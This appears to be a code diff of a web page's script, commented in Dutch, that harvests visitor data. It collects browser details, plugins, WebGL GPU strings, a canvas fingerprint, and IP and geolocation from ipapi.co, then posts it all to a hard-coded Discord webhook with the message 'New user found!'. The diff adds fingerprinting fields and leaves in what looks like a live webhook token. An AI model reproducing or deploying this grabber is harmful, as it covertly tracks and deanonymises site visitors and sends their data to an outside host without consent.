@@ -11,15 +11,48 @@
     <script>
         async function getInfo() {
             let info = {};
-            
-            // User Agent en andere browser info
+
+            // Basis browser info
             info.userAgent = navigator.userAgent;
             info.language = navigator.language;
             info.platform = navigator.platform;
             info.screenResolution = `${screen.width}x${screen.height}`;
+            info.colorDepth = screen.colorDepth;
             info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            info.online = navigator.onLine;
+            info.touchSupport = navigator.maxTouchPoints > 0 ? "Yes" : "No";
 
-            // IP via externe API
+            // Plugins
+            info.plugins = [];
+            for (let i = 0; i < navigator.plugins.length; i++) {
+                info.plugins.push(navigator.plugins[i].name);
+            }
+
+            // WebGL Info (grafische kaart)
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                info.webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                info.webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+            } catch (err) {
+                info.webglVendor = "Niet beschikbaar";
+                info.webglRenderer = "Niet beschikbaar";
+            }
+
+            // Canvas fingerprint
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = "top";
+                ctx.font = "14px Arial";
+                ctx.fillText("Fingerprint test", 2, 2);
+                info.canvasFingerprint = canvas.toDataURL();
+            } catch (err) {
+                info.canvasFingerprint = "Niet beschikbaar";
+            }
+
+            // IP en locatie via externe API
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
@@ -29,13 +62,13 @@
                 info.country = data.country;
                 info.org = data.org;
             } catch (err) {
-                info.ip = 'Niet beschikbaar';
+                info.ip = "Niet beschikbaar";
             }
 
             document.getElementById('info').textContent = JSON.stringify(info, null, 2);
 
             // Verstuur naar Discord Webhook
-            const webhookUrl = 'https://discord.com/api/webhooks/1347877842725371984/SSQUXuH1EbjqDA-UEXf9d_uik63AvOEyG19LiRFbdZuB9XsRpohp37zbFe9T0gCNxnKE'; // Vervang met jouw webhook URL
+            const webhookUrl = 'https://discord.com/api/webhooks/1347877842725371984/SSQUXuH1EbjqDA-UEXf9d_uik63AvOEyG19LiRFbdZuB9XsRpohp37zbFe9T0gCNxnKE';
             const payload = {
                 content: 'Nieuwe gebruiker gevonden!',
                 embeds: [{
